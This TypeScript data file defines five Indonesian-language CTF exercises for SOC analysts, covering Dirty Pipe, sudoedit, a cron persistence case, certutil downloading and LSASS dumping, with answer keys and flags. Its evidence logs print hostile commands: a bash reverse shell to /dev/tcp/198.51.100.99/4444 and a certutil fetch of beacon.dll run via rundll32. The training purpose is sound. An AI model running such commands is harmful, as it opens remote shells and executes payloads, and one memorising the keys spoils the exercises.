/**
 * Category E: Endpoint & Privilege Escalation (Challenges RC-CTF-018 to RC-CTF-022)
 * Conforms to LAPS-Heuristik SOC Investigation Architecture:
 * Case File -> Mission -> Evidence -> Timeline -> Investigation -> Flag -> Mitigation -> Reflection
 */

export const ENDPOINT_CHALLENGES = [
  {
    id: "RC-CTF-018",
    aliasId: "ctf-018",
    title: "Kernel Exploit Triage & Triage Decision (Jangan Asal Block Dulu)",
    category: "endpoint",
    difficulty: "advanced",
    estimatedMinutes: 20,
    xpReward: 175,
    sourceId: "cve-2022-0847",
    affectedTechnology: "Linux Kernel 5.8 through 5.16.11",
    mitreTechniques: ["T1068", "T1565.001"],
    lapsStage: "review",
    attackCategory: "endpoint",
    realWorldCase: "Sistem pendeteksi integritas file (AIDE) membunyikan alarm ketika berkas /etc/passwd yang berstatus read-only bagi user biasa tiba-tiba termodifikasi tanpa pemanggilan biner sudo atau pam_authenticate.",
    flag: "FLAG{JANGAN_ASAL_BLOCK_DULU}",
    flagConfig: {
      value: "FLAG{JANGAN_ASAL_BLOCK_DULU}",
      caseSensitive: false,
      maxAttempts: 5
    },
    mission: {
      objective: "Buat keputusan triase yang tepat pada insiden eksploitasi kernel lokal Dirty Pipe (CVE-2022-0847) tanpa tergesa-gesa memblokir lalu lintas jaringan sebelum memahami konteks proses host.",
      successCriteria: [
        "Analisis log auditd untuk mengetahui berkas dan biner eksekusi /tmp/dirtypipe",
        "Identifikasi pengguna lokal UID 1003 yang memodifikasi berkas /etc/passwd",
        "Tinjau diff modifikasi baris root hash pada passwd.diff",
        "Submit flag dan formulasikan patch kernel Linux"
      ]
    },
    caseBrief: {
      incidentCode: "INC-EP-018",
      targetHost: "DEV-BUILD-01 (10.0.20.18)",
      detectionSource: "Linux Auditd & File Integrity Monitor (AIDE)",
      narrative: "Sistem pendeteksi integritas file (AIDE) membunyikan alarm ketika berkas /etc/passwd yang berstatus read-only bagi user biasa tiba-tiba termodifikasi tanpa pemanggilan biner sudo atau pam_authenticate.",
      mission: [
        "1. Analisis log auditd untuk mengetahui berkas dan proses yang memodifikasi /etc/passwd.",
        "2. Identifikasi pengguna lokal yang melakukan eksploitasi kernel Dirty Pipe.",
        "3. Temukan password hash baru yang disisipkan penyerang untuk memperoleh root.",
        "4. Dapatkan flag eksploitasi kernel dan tentukan mitigasi patching kernel OS."
      ]
    },
    timeline: [
      { time: "14:20:01 WIB", sensor: "audit.log", event: "SYSCALL splice (syscall 293) executed on /etc/passwd by /tmp/dirtypipe (uid 1003)" },
      { time: "14:20:05 WIB", sensor: "audit.log", event: "EXECVE /bin/sh spawned" },
      { time: "14:20:10 WIB", sensor: "audit.log", event: "USER_AUTH op=PAM:authentication acct=root exe=/bin/su res=success" }
    ],
    evidencePack: [
      {
        id: "ev-018-a",
        fileName: "audit.log",
        fileType: "auditd",
        description: "Catatan syscall dan modifikasi berkas sistem auditd",
        content: `type=SYSCALL msg=audit(1664356801.120:8041): arch=c000003e syscall=293 success=yes exit=0 a0=3 a1=4 a2=0 a3=1000 items=1 ppid=4100 pid=4122 auid=1003 uid=1003 gid=1003 euid=1003 suid=1003 fsuid=1003 ses=12 comm="exploit" exe="/tmp/dirtypipe"
type=PATH msg=audit(1664356801.120:8041): item=0 name="/etc/passwd" inode=132410 dev=08:01 mode=0100644 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL cap_fp=0000000000000000 cap_fi=0000000000000000 cap_fe=0 cap_fver=0
type=EXECVE msg=audit(1664356805.410:8042): argc=1 a0="/bin/sh"
type=USER_AUTH msg=audit(1664356810.224:8043): pid=4130 uid=0 auid=1003 ses=12 msg='op=PAM:authentication grantors=pam_unix acct="root" exe="/bin/su" hostname=? addr=? terminal=pts/1 res=success'`
      },
      {
        id: "ev-018-b",
        fileName: "passwd.diff",
        fileType: "diff",
        description: "Perbandingan berkas /etc/passwd sebelum dan sesudah insiden",
        content: `--- /etc/passwd.bak
+++ /etc/passwd
@@ -1,3 +1,3 @@
-root:x:0:0:root:/root:/bin/bash
+root:$6$pipedroot$JqZqE8...:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin`
      }
    ],
    questions: [
      {
        id: "q1",
        question: "Biner eksekusi apa yang dijalankan oleh pengguna bernomor UID 1003 pada direktori /tmp?",
        type: "single_choice",
        options: [
          { id: "a", text: "/tmp/dirtypipe" },
          { id: "b", text: "/usr/bin/sudo" },
          { id: "c", text: "/bin/sh" },
          { id: "d", text: "/usr/sbin/service" }
        ],
        correctAnswer: "a",
        explanation: "Log auditd EXECVE mencatat comm='exploit' exe='/tmp/dirtypipe' dijalankan oleh uid=1003."
      },
      {
        id: "q2",
        question: "Kelemahan kernel apakah (CVE-2022-0847) yang memungkinkan penulisan ke berkas read-only tanpa izin root?",
        type: "single_choice",
        options: [
          { id: "a", text: "Dirty Pipe (penimpaan page cache pipa kernel)" },
          { id: "b", text: "Log4Shell JNDI injection" },
          { id: "c", text: "EternalBlue SMBv1" },
          { id: "d", text: "SQL Injection union select" }
        ],
        correctAnswer: "a",
        explanation: "CVE-2022-0847 dikenal sebagai Dirty Pipe yang mengeksploitasi bendera PIPE_BUF_FLAG_CAN_MERGE pada page cache kernel Linux."
      },
      {
        id: "q3",
        question: "Langkah mitigasi paling permanen untuk mengatasi kerentanan Dirty Pipe adalah:",
        type: "single_choice",
        options: [
          { id: "a", text: "Memperbarui kernel Linux ke versi yang telah ditambal (>= 5.16.11, 5.15.25, 5.10.102)" },
          { id: "b", text: "Menghapus direktori /tmp" },
          { id: "c", text: "Mematikan koneksi internet port 80" },
          { id: "d", text: "Mengubah port SSH ke 2222" }
        ],
        correctAnswer: "a",
        explanation: "Karena cacat ada pada kode kernel OS, update kernel ke versi yang bebas bug merupakan solusi definitif."
      }
    ],
    hints: [
      { tier: 1, text: "Eksploitasi kernel terjadi secara lokal di endpoint; jangan tergesa-gesa memblokir firewall jaringan tanpa memeriksa proses sistem." },
      { tier: 2, text: "Periksa biner pada field 'exe=' di log auditd dan file diff passwd.diff." },
      { tier: 3, text: "Keputusan triase yang bijak mengutamakan investigasi host daripada asal blokir jaringan." }
    ],
    mitigationSummary: "Perbarui kernel Linux ke versi LTS terkini yang sudah ditambal. Terapkan batasan noexec pada partisi /tmp dan /dev/shm untuk mencegah eksekusi payload lokal.",
    mitigation: [
      "Perbarui kernel Linux ke versi >= 5.16.11 / 5.15.25 LTS",
      "Mount direktori /tmp dan /var/tmp dengan opsi noexec, nosuid, nodev",
      "Audit integritas file /etc/passwd secara kontinu menggunakan AIDE/Tripwire"
    ],
    reflection: [
      "Mengapa analis SOC harus menahan diri dari keputusan impulsif asal memblokir firewall?",
      "Evidence mana yang membuktikan eskalasi privilese berasal dari proses lokal bukan jaringan?",
      "Apakah ada kemungkinan false positive jika sysadmin melakukan pembaruan user resmi?",
      "Bagaimana cara memvalidasi keputusanmu dengan melihat hash password root di passwd.diff?",
      "Mitigasi apa yang mencegah eksekusi biner exploit pada direktori sementara (/tmp)?"
    ],
    lapsMapping: {
      understand: "Mengidentifikasi modifikasi file sistem kritis /etc/passwd oleh biner unprivileged.",
      plan: "Menganalisis audit log untuk melacak UID eksekutor dan syscall kernel.",
      execute: "Mengkorelasikan CVE kernel exploit Dirty Pipe dengan bukti auditd dan diff file.",
      review: "Memverifikasi integritas file OS dan merancang kebijakan patching kernel berkesinambungan."
    }
  },
  {
    id: "RC-CTF-019",
    aliasId: "ctf-019",
    title: "Sudoedit Vulnerability & Evidence-Based Reasoning (Evidence Dulu Baru Nuduh)",
    category: "endpoint",
    difficulty: "intermediate",
    estimatedMinutes: 15,
    xpReward: 100,
    sourceId: "cve-2021-3156",
    affectedTechnology: "Sudo 1.8.2 through 1.8.31p2 / 1.9.0 through 1.9.5p1",
    mitreTechniques: ["T1068"],
    lapsStage: "review",
    attackCategory: "endpoint",
    realWorldCase: "Peringatan SOC menunjukkan adanya serangkaian pemanggilan sudoedit dengan argumen escaping backslash di akhir string ('\\') yang berulang kali memicu crash segmentasi memori dan berujung pada spawn shell root.",
    flag: "FLAG{EVIDENCE_DULU_BARU_NUDUH}",
    flagConfig: {
      value: "FLAG{EVIDENCE_DULU_BARU_NUDUH}",
      caseSensitive: false,
      maxAttempts: 5
    },
    mission: {
      objective: "Terapkan penalaran berbasis bukti (evidence-based reasoning): temukan bukti konkret pemanggilan sudoedit dan korelasi memory crash sebelum menuduh akun intern.",
      successCriteria: [
        "Temukan baris pemanggilan sudoedit -s \\ pada auth.log",
        "Identifikasi crash segfault libc-2.31.so pada log kernel",
        "Buktikan pembukaan sesi root oleh pengguna intern (uid=0)",
        "Submit flag dan rancang pembaharuan paket sudo"
      ]
    },
    caseBrief: {
      incidentCode: "INC-EP-019",
      targetHost: "FILE-SRV-LINUX (10.0.20.19)",
      detectionSource: "Syslog auth.log & Auditd Execution Tracer",
      narrative: "Peringatan SOC menunjukkan adanya serangkaian pemanggilan sudoedit dengan argumen escaping backslash di akhir string ('\\') yang berulang kali memicu crash segmentasi memori dan berujung pada spawn shell root.",
      mission: [
        "1. Temukan baris pemanggilan biner sudo/sudoedit yang mengeksploitasi unescape loop.",
        "2. Identifikasi parameter baris perintah yang digunakan oleh pelaku.",
        "3. Dapatkan flag validasi eskalasi privilese Baron Samedit."
      ]
    },
    timeline: [
      { time: "14:22:01 WIB", sensor: "auth.log", event: "intern executed sudoedit -s \\ from pts/2" },
      { time: "14:22:02 WIB", sensor: "kernel.log", event: "sudoedit[5120]: segfault at 7ffd5401 in libc-2.31.so" },
      { time: "14:22:05 WIB", sensor: "auth.log", event: "intern executed sudoedit -s \\ 112233445566\\" },
      { time: "14:22:06 WIB", sensor: "auth.log", event: "pam_unix(sudo:session): session opened for user root by intern(uid=0)" }
    ],
    evidencePack: [
      {
        id: "ev-019-a",
        fileName: "auth.log",
        fileType: "syslog",
        description: "Log autentikasi dan eksekusi sudo",
        content: `Sep 28 14:22:01 file-srv sudo:   intern : TTY=pts/2 ; PWD=/home/intern ; USER=root ; COMMAND=/usr/bin/sudoedit -s \\
Sep 28 14:22:02 file-srv kernel: [ 8421.112091] sudoedit[5120]: segfault at 7ffd5401 ip 00007f981240 sp 7ffd5400 error 4 in libc-2.31.so
Sep 28 14:22:05 file-srv sudo:   intern : TTY=pts/2 ; PWD=/home/intern ; USER=root ; COMMAND=/usr/bin/sudoedit -s \\ 112233445566\\
Sep 28 14:22:06 file-srv sudo:   pam_unix(sudo:session): session opened for user root by intern(uid=0)`
      }
    ],
    questions: [
      {
        id: "q1",
        question: "Biner utilitas apa yang disalahgunakan dengan flag '-s \\\\' untuk memicu heap overflow?",
        type: "single_choice",
        options: [
          { id: "a", text: "sudoedit" },
          { id: "b", text: "systemctl" },
          { id: "c", text: "chmod" },
          { id: "d", text: "passwd" }
        ],
        correctAnswer: "a",
        explanation: "CVE-2021-3156 mengeksploitasi parsing argumen baris perintah sudoedit saat dijalankan dengan mode shell (-s) dan diakhiri karakter backslash."
      },
      {
        id: "q2",
        question: "Pengguna lokal mana yang memicu eksploitasi dan mendapatkan sesi uid=0?",
        type: "single_choice",
        options: [
          { id: "a", text: "intern" },
          { id: "b", text: "student" },
          { id: "c", text: "backup" },
          { id: "d", text: "nobody" }
        ],
        correctAnswer: "a",
        explanation: "Baris log mencatat session opened for user root by intern(uid=0)."
      }
    ],
    hints: [
      { tier: 1, text: "Bangun penalaran berbasis bukti sebelum menuduh akun pengguna secara gegabah." },
      { tier: 2, text: "Periksa argumen baris perintah sudoedit dan catatan segfault libc pada auth.log." },
      { tier: 3, text: "Korelasi antara crash heap overflow dan pembukaan sesi root memberikan bukti tak terbantahkan." }
    ],
    mitigationSummary: "Update paket sudo ke versi 1.9.5p2 atau lebih baru. Lakukan audit pada sudoers file.",
    mitigation: [
      "Perbarui paket sudo ke versi >= 1.9.5p2",
      "Audit konfigurasi /etc/sudoers dan batasi hak sudoedit",
      "Aktifkan deteksi memori crash segmentasi pada SIEM"
    ],
    reflection: [
      "Mengapa analis harus mendasarkan kesimpulan pada bukti (evidence) bukan kecurigaan semata?",
      "Evidence mana yang membuktikan buffer overflow berhasil menembus kontrol akses?",
      "Apakah ada kemungkinan false positive jika developer salah mengetikkan perintah di terminal?",
      "Bagaimana cara memvalidasi keputusanmu dengan melihat session opened UID 0?",
      "Mitigasi apa yang menjamin utilitas sistem terlindung dari eksploitasi buffer overflow?"
    ],
    lapsMapping: {
      understand: "Memahami mekanisme eskalasi privilese lokal via heap buffer overflow sudo.",
      plan: "Mencari kegagalan segmentasi memori dan parameter baris perintah yang aneh pada auth.log.",
      execute: "Mengekstrak bukti eksekusi sudoedit -s dan eskalasi ke uid 0.",
      review: "Merancang prosedur update paket keamanan berkala pada server Linux."
    }
  },
  {
    id: "RC-CTF-020",
    aliasId: "ctf-020",
    title: "Cron Reverse Shell & Auth Correlation (Siapa Suruh Login 100 Kali)",
    category: "endpoint",
    difficulty: "beginner",
    estimatedMinutes: 15,
    xpReward: 50,
    sourceId: "mitre-t1053-cron",
    affectedTechnology: "Linux Vixie Cron / crontab spool",
    mitreTechniques: ["T1053.003", "T1059.004"],
    lapsStage: "review",
    attackCategory: "endpoint",
    realWorldCase: "Setelah melakukan percobaan login gagal lebih dari 100 kali hingga membobol akun layanan web, penyerang menanamkan skrip reverse shell berkala pada berkas cron spool.",
    flag: "FLAG{SIAPA_SURUH_LOGIN_100_KALI}",
    flagConfig: {
      value: "FLAG{SIAPA_SURUH_LOGIN_100_KALI}",
      caseSensitive: false,
      maxAttempts: 5
    },
    mission: {
      objective: "Korelasikan pembobolan otentikasi login masif dengan persistensi cron job yang mengeksekusi reverse shell setiap 5 menit.",
      successCriteria: [
        "Analisis berkas crontab.www-data untuk menemukan perintah /dev/tcp/",
        "Hitung interval eksekusi berkala (setiap 5 menit)",
        "Identifikasi port C2 tujuan penyerang (4444)",
        "Submit flag dan rancang isolasi cron spool"
      ]
    },
    caseBrief: {
      incidentCode: "INC-EP-020",
      targetHost: "WEB-APP-02 (10.0.20.20)",
      detectionSource: "Syslog cron.log & Network Socket Monitor",
      narrative: "Setelah melakukan percobaan login gagal lebih dari 100 kali hingga membobol akun layanan web, penyerang menanamkan skrip reverse shell berkala pada berkas cron spool.",
      mission: [
        "1. Buka berkas crontab yang mencurigakan di dalam direktori /var/spool/cron/crontabs/.",
        "2. Identifikasi perintah reverse shell yang dieksekusi secara otomatis.",
        "3. Tentukan port C2 penyerang dan peroleh flag persistensi."
      ]
    },
    timeline: [
      { time: "14:55:00 WIB", sensor: "auth.log", event: "Brute force burst: 100+ failed logins followed by session accept for www-data" },
      { time: "15:00:01 WIB", sensor: "cron.log", event: "CRON[7821]: (www-data) CMD (/bin/bash -c 'bash -i >& /dev/tcp/198.51.100.99/4444 0>&1')" },
      { time: "15:05:01 WIB", sensor: "cron.log", event: "CRON[7912]: (www-data) CMD (/bin/bash -c 'bash -i >& /dev/tcp/198.51.100.99/4444 0>&1')" }
    ],
    evidencePack: [
      {
        id: "ev-020-a",
        fileName: "crontab.www-data",
        fileType: "cron_spool",
        description: "Isi berkas jadwal cron akun layanan www-data",
        content: `# /var/spool/cron/crontabs/www-data
# Scheduled maintenance script
*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/198.51.100.99/4444 0>&1' # system-keepalive`
      },
      {
        id: "ev-020-b",
        fileName: "cron.log",
        fileType: "syslog",
        description: "Catatan daemon cron saat mengeksekusi tugas",
        content: `Sep 28 15:00:01 web-app CRON[7821]: (www-data) CMD (/bin/bash -c 'bash -i >& /dev/tcp/198.51.100.99/4444 0>&1' # system-keepalive)
Sep 28 15:05:01 web-app CRON[7912]: (www-data) CMD (/bin/bash -c 'bash -i >& /dev/tcp/198.51.100.99/4444 0>&1' # system-keepalive)`
      }
    ],
    questions: [
      {
        id: "q1",
        question: "Berapa interval waktu eksekusi cron job jahat tersebut berdasarkan sintaks '*/5 * * * *'?",
        type: "single_choice",
        options: [
          { id: "a", text: "Setiap 5 menit sekali" },
          { id: "b", text: "Setiap 5 jam sekali" },
          { id: "c", text: "Setiap hari jam 5 pagi" },
          { id: "d", text: "Hanya setiap tanggal 5" }
        ],
        correctAnswer: "a",
        explanation: "Sintaks */5 pada kolom menit crontab mengeksekusi perintah setiap interval 5 menit."
      },
      {
        id: "q2",
        question: "Berapa nomor port tujuan remote shell yang dibuka ke IP 198.51.100.99?",
        type: "single_choice",
        options: [
          { id: "a", text: "4444" },
          { id: "b", text: "80" },
          { id: "c", text: "443" },
          { id: "d", text: "22" }
        ],
        correctAnswer: "a",
        explanation: "Koneksi dialihkan melalui pseudo-device /dev/tcp/198.51.100.99/4444."
      }
    ],
    hints: [
      { tier: 1, text: "Korelasikan upaya login berulang 100 kali dengan keberhasilan penanaman persistensi cron job." },
      { tier: 2, text: "Periksa interval */5 dan nomor port di ujung string /dev/tcp/ pada berkas crontab.www-data." },
      { tier: 3, text: "Jadwal cron mengeksekusi shell interaktif ke IP C2 eksternal setiap 5 menit secara otomatis." }
    ],
    mitigationSummary: "Hapus entri berbahaya dari crontab www-data, isolasi port outbound 4444 pada firewall perimeter, dan batasi izin akses /etc/cron*.",
    mitigation: [
      "Hapus baris reverse shell dari /var/spool/cron/crontabs/www-data",
      "Kunci izin crontab hanya untuk user resmi melalui /etc/cron.allow",
      "Blokir koneksi outbound port 4444 pada perimeter firewall"
    ],
    reflection: [
      "Mengapa korelasi antara brute force beruntun dan pembuatan cron job sangat krusial?",
      "Evidence mana yang membuktikan koneksi TCP keluar dijalankan oleh cron daemon?",
      "Apakah ada kemungkinan false positive jika sysadmin membuat backup otomatis?",
      "Bagaimana cara memvalidasi keputusanmu dengan melihat proses bash -i yang aktif?",
      "Mitigasi apa yang mencegah akun service www-data memiliki shell interaktif?"
    ],
    lapsMapping: {
      understand: "Mengenali teknik persistensi menggunakan scheduled task / cron pada Linux.",
      plan: "Memeriksa cron spool pengguna service dan log daemon cron.",
      execute: "Menganalisis payload reverse shell dan parameter C2 penyerang.",
      review: "Mengonfigurasi pembatasan cron (cron.allow/cron.deny) dan monitoring koneksi outbound aneh."
    }
  },
  {
    id: "RC-CTF-021",
    aliasId: "ctf-021",
    title: "LOLBAS Certutil Dropper & Incident Response Protocol (CTF Dulu Mitigasi Kemudian)",
    category: "endpoint",
    difficulty: "intermediate",
    estimatedMinutes: 20,
    xpReward: 100,
    sourceId: "mitre-t1218-certutil",
    affectedTechnology: "Microsoft Windows certutil.exe & Sysmon Event ID 1",
    mitreTechniques: ["T1218.011", "T1105"],
    lapsStage: "review",
    attackCategory: "endpoint",
    realWorldCase: "Antivirus bawaan tidak membunyikan peringatan, namun sensor Sysmon merekam eksekusi utilitas sistem legal certutil.exe dengan argumen aneh untuk mengunduh berkas binary dari domain eksternal.",
    flag: "FLAG{CTF_DULU_MITIGASI_KEMUDIAN}",
    flagConfig: {
      value: "FLAG{CTF_DULU_MITIGASI_KEMUDIAN}",
      caseSensitive: false,
      maxAttempts: 5
    },
    mission: {
      objective: "Jalankan protokol tanggap insiden sistematis: temukan rantai eksekusi LOLBAS certutil.exe terlebih dahulu sebelum menerapkan mitigasi EDR dan firewall.",
      successCriteria: [
        "Analisis Sysmon Event ID 1 (Process Create) pada sysmon_process_create.json",
        "Identifikasi URL download eksternal dan berkas lokal tujuan penulisan payload",
        "Lacak proses eksekusi DLL lanjutan via rundll32.exe",
        "Submit flag dan rancang kebijakan AppLocker WDAC"
      ]
    },
    caseBrief: {
      incidentCode: "INC-EP-021",
      targetHost: "WIN-WORKSTATION-11 (10.0.50.11)",
      detectionSource: "Sysmon Operational Event Log",
      narrative: "Antivirus bawaan tidak membunyikan peringatan, namun sensor Sysmon merekam eksekusi utilitas sistem legal certutil.exe dengan argumen aneh untuk mengunduh berkas binary dari domain eksternal.",
      mission: [
        "1. Analisis Sysmon Event ID 1 (Process Create).",
        "2. Identifikasi URL download eksternal dan berkas lokal tujuan penulisan payload.",
        "3. Temukan flag teknik Living-off-the-Land (LOLBAS)."
      ]
    },
    timeline: [
      { time: "16:10:02 WIB", sensor: "sysmon.json", event: "cmd.exe spawned certutil.exe with URL cache split flags" },
      { time: "16:10:05 WIB", sensor: "sysmon.json", event: "certutil.exe downloaded beacon.dll to C:\\Users\\Public\\beacon.dll" },
      { time: "16:10:10 WIB", sensor: "sysmon.json", event: "rundll32.exe executed beacon.dll,StartW entrypoint" }
    ],
    evidencePack: [
      {
        id: "ev-021-a",
        fileName: "sysmon_process_create.json",
        fileType: "sysmon_json",
        description: "Log telemetri pembuatan proses Sysmon Event ID 1",
        content: `[
  {
    "EventID": 1,
    "TimeCreated": "2026-09-28T16:10:02Z",
    "Image": "C:\\\\Windows\\\\System32\\\\cmd.exe",
    "CommandLine": "cmd.exe /c start /b certutil.exe -urlcache -split -f http://cdn-payload.test/beacon.dll C:\\\\Users\\\\Public\\\\beacon.dll",
    "ParentImage": "C:\\\\Windows\\\\explorer.exe",
    "User": "OFFICE\\\\budi"
  },
  {
    "EventID": 1,
    "TimeCreated": "2026-09-28T16:10:05Z",
    "Image": "C:\\\\Windows\\\\System32\\\\certutil.exe",
    "CommandLine": "certutil.exe  -urlcache -split -f http://cdn-payload.test/beacon.dll C:\\\\Users\\\\Public\\\\beacon.dll",
    "ParentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe",
    "User": "OFFICE\\\\budi"
  },
  {
    "EventID": 1,
    "TimeCreated": "2026-09-28T16:10:10Z",
    "Image": "C:\\\\Windows\\\\System32\\\\rundll32.exe",
    "CommandLine": "rundll32.exe C:\\\\Users\\\\Public\\\\beacon.dll,StartW",
    "ParentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe",
    "User": "OFFICE\\\\budi"
  }
]`
      }
    ],
    questions: [
      {
        id: "q1",
        question: "Parameter certutil apa yang digunakan pelaku untuk mematikan caching dan memaksa pengunduhan langsung?",
        type: "single_choice",
        options: [
          { id: "a", text: "-urlcache -split -f" },
          { id: "b", text: "-dump -v" },
          { id: "c", text: "-encode -decode" },
          { id: "d", text: "-verifykeys" }
        ],
        correctAnswer: "a",
        explanation: "-urlcache -split -f adalah switch khas yang sering disalahgunakan penyerang untuk memanfaatkan certutil sebagai downloader."
      },
      {
        id: "q2",
        question: "Biner eksekusi sistem apa yang kemudian digunakan untuk menjalankan berkas DLL yang baru diunduh?",
        type: "single_choice",
        options: [
          { id: "a", text: "rundll32.exe" },
          { id: "b", text: "powershell.exe" },
          { id: "c", text: "notepad.exe" },
          { id: "d", text: "taskmgr.exe" }
        ],
        correctAnswer: "a",
        explanation: "rundll32.exe C:\\Users\\Public\\beacon.dll,StartW dieksekusi pada detik 16:10:10."
      }
    ],
    hints: [
      { tier: 1, text: "Lakukan tahapan investigasi hingga tuntas sebelum menerapkan tindakan mitigasi terburu-buru." },
      { tier: 2, text: "Periksa parameter -urlcache -split -f pada biner certutil dan eksekusi rundll32 pada sysmon_process_create.json." },
      { tier: 3, text: "Rantai proses LOLBAS terkonfirmasi dari pengunduhan stager hingga pemanggilan DLL di direktori Public." }
    ],
    mitigationSummary: "Terapkan AppLocker / Windows Defender Application Control (WDAC) untuk memblokir eksekusi certutil dengan parameter URL, serta blokir domain eksternal tidak dikenal.",
    mitigation: [
      "Blokir eksekusi certutil.exe dengan parameter -urlcache melalui EDR attack surface reduction",
      "Karantina berkas C:\\Users\\Public\\beacon.dll dan cabut sesi login user budi",
      "Gunakan AppLocker / WDAC untuk melarang rundll32 mengeksekusi DLL dari direktori yang dapat ditulisi user biasa"
    ],
    reflection: [
      "Mengapa penyelidikan insiden harus tuntas sebelum mitigasi diterapkan?",
      "Evidence mana yang membuktikan utilitas legal Windows disalahgunakan sebagai downloader?",
      "Apakah ada kemungkinan false positive jika admin mengunduh sertifikat SSL?",
      "Bagaimana cara memvalidasi keputusanmu dengan melihat rantai proses parent-child?",
      "Mitigasi apa yang efektif membatasi ruang gerak teknik Living-off-the-Land?"
    ],
    lapsMapping: {
      understand: "Memahami konsep Living-off-the-Land Binaries and Scripts (LOLBAS).",
      plan: "Menganalisis rantai proses induk-anak pada log Sysmon Event ID 1.",
      execute: "Mengekstrak URL payload dan biner runner rundll32.exe.",
      review: "Menyusun aturan deteksi EDR berbasis parameter baris perintah certutil."
    }
  },
  {
    id: "RC-CTF-022",
    aliasId: "ctf-022",
    title: "LSASS Memory Dumping & IOC Extraction (IOC-nya Ketemu Ges)",
    category: "endpoint",
    difficulty: "advanced",
    estimatedMinutes: 20,
    xpReward: 175,
    sourceId: "mitre-t1003-lsass",
    affectedTechnology: "Microsoft Windows Local Security Authority Subsystem Service (LSASS)",
    mitreTechniques: ["T1003.001"],
    lapsStage: "review",
    attackCategory: "endpoint",
    realWorldCase: "Domain Controller mendeteksi proses PowerShell mencurigakan yang meminta izin akses memori penuh ke proses lsass.exe, diikuti pembentukan berkas dump berukuran besar di direktori Temp.",
    flag: "FLAG{IOC_NYA_KETEMU_GES}",
    flagConfig: {
      value: "FLAG{IOC_NYA_KETEMU_GES}",
      caseSensitive: false,
      maxAttempts: 5
    },
    mission: {
      objective: "Identifikasi indikator kompromi (IOC) konkret dari percobaan dump memori LSASS untuk pencurian hash kredensial.",
      successCriteria: [
        "Analisis Sysmon Event ID 10 untuk menemukan GrantedAccess mask 0x1FFFFF",
        "Identifikasi berkas artefak TargetFilename C:\\Windows\\Temp\\lsass_dump.dmp",
        "Ekstrak IOC proses sumber PowerShell dan akun yang mengeksekusinya",
        "Submit flag dan rancang konfigurasi LSA Protection RunAsPPL"
      ]
    },
    caseBrief: {
      incidentCode: "INC-EP-022",
      targetHost: "WIN-DC-01 (10.0.50.5)",
      detectionSource: "Sysmon Event ID 10 (ProcessAccess) & Event ID 11 (FileCreate)",
      narrative: "Domain Controller mendeteksi proses PowerShell mencurigakan yang meminta izin akses memori penuh ke proses lsass.exe, diikuti pembentukan berkas dump berukuran besar di direktori Temp.",
      mission: [
        "1. Analisis Sysmon Event ID 10 untuk menemukan GrantedAccess code terhadap lsass.exe.",
        "2. Identifikasi berkas minidump yang dibuat penyerang untuk mencuri hash password.",
        "3. Dapatkan flag pembobolan kredensial LSASS."
      ]
    },
    timeline: [
      { time: "17:45:11 WIB", sensor: "sysmon_event10_lsass.json", event: "PowerShell requested GrantedAccess 0x1FFFFF (PROCESS_ALL_ACCESS) to lsass.exe" },
      { time: "17:45:13 WIB", sensor: "sysmon_event10_lsass.json", event: "FileCreate: C:\\Windows\\Temp\\lsass_dump.dmp created by PowerShell" }
    ],
    evidencePack: [
      {
        id: "ev-022-a",
        fileName: "sysmon_event10_lsass.json",
        fileType: "sysmon_json",
        description: "Log akses proses terhadap LSASS",
        content: `[
  {
    "EventID": 10,
    "TimeCreated": "2026-09-28T17:45:11Z",
    "SourceImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
    "TargetImage": "C:\\\\Windows\\\\System32\\\\lsass.exe",
    "GrantedAccess": "0x1FFFFF",
    "CallTrace": "C:\\\\Windows\\\\SYSTEM32\\\\ntdll.dll+9fb34|C:\\\\Windows\\\\System32\\\\KERNELBASE.dll+2c34e",
    "SourceUser": "OFFICE\\\\admin_temp"
  },
  {
    "EventID": 11,
    "TimeCreated": "2026-09-28T17:45:13Z",
    "Image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
    "TargetFilename": "C:\\\\Windows\\\\Temp\\\\lsass_dump.dmp",
    "CreationUtcTime": "2026-09-28 17:45:13.102"
  }
]`
      }
    ],
    questions: [
      {
        id: "q1",
        question: "Nilai GrantedAccess '0x1FFFFF' pada Sysmon Event ID 10 mengindikasikan jenis izin akses apa?",
        type: "single_choice",
        options: [
          { id: "a", text: "PROCESS_ALL_ACCESS (izin baca dan manipulasi memori penuh)" },
          { id: "b", text: "PROCESS_QUERY_LIMITED_INFORMATION (hanya membaca nama proses)" },
          { id: "c", text: "PROCESS_TERMINATE (hanya mematikan proses)" },
          { id: "d", text: "ACCESS_DENIED (akses ditolak)" }
        ],
        correctAnswer: "a",
        explanation: "0x1FFFFF adalah mask akses penuh (PROCESS_ALL_ACCESS) yang diminta attacker untuk membaca memori plaintext/hash kredensial LSASS."
      },
      {
        id: "q2",
        question: "Apa nama berkas dump memori kredensial yang dihasilkan di direktori Temp?",
        type: "single_choice",
        options: [
          { id: "a", text: "C:\\Windows\\Temp\\lsass_dump.dmp" },
          { id: "b", text: "C:\\Windows\\System32\\ntdll.dll" },
          { id: "c", text: "C:\\Windows\\Temp\\debug.log" },
          { id: "d", text: "C:\\pagefile.sys" }
        ],
        correctAnswer: "a",
        explanation: "Sysmon Event ID 11 mencatat TargetFilename C:\\Windows\\Temp\\lsass_dump.dmp."
      }
    ],
    hints: [
      { tier: 1, text: "Ekstrak indikator ancaman (IOC) konkret berupa mask akses memori dan nama file dump." },
      { tier: 2, text: "Periksa nilai GrantedAccess pada Event ID 10 dan TargetFilename pada Event ID 11." },
      { tier: 3, text: "IOC bernilai tinggi mencakup izin PROCESS_ALL_ACCESS (0x1FFFFF) dan artefak lsass_dump.dmp." }
    ],
    mitigationSummary: "Aktifkan LSA Protection (RunAsPPL=1), Credential Guard berbasis virtualisasi (VBS), dan batasi hak SeDebugPrivilege.",
    mitigation: [
      "Aktifkan LSA Protection RunAsPPL=1 di registry HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa",
      "Nyalakan Windows Defender Credential Guard berbasis Hyper-V VBS",
      "Cabut hak SeDebugPrivilege dari grup non-domain admin"
    ],
    reflection: [
      "Mengapa ekstraksi IOC konkret (path file, hash, granted access) sangat krusial bagi SOC?",
